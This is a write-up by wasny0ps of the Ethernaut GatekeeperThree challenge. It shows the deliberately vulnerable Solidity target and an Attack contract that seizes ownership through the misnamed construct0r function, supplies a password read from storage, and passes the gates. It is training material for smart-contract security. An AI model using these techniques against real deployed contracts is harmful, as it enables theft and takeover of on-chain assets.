<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel28.svg" />

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```

Challenge's message:

> Cope with gates and become an entrant. Things that might help: Recall return values of low-level functions. Be attentive with semantic. Refresh how storage works in Ethereum

# Subverting 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0.;

import "./Level.sol";

contract Attack{
    GatekeeperThree target;

    constructor(address payable _target){
        target =  GatekeeperThree(_target);
    }

    function attack(uint256 _password) external payable  {
        address(target).call{value: msg.value}("");
        target.construct0r();
        target.getAllowance(_password);
        target.enter();
    }

    fallback() external payable {
        revert();
     }
}
```
Challenge's message:

> Nice job! For more information read [this](https://web3js.readthedocs.io/en/v1.2.9/web3-eth.html?highlight=getStorageAt#getstorageat) and [this](https://medium.com/loom-network/ethereum-solidity-memory-vs-storage-how-to-initialize-an-array-inside-a-struct-184baf6aa2eb).

***by wasny0ps***
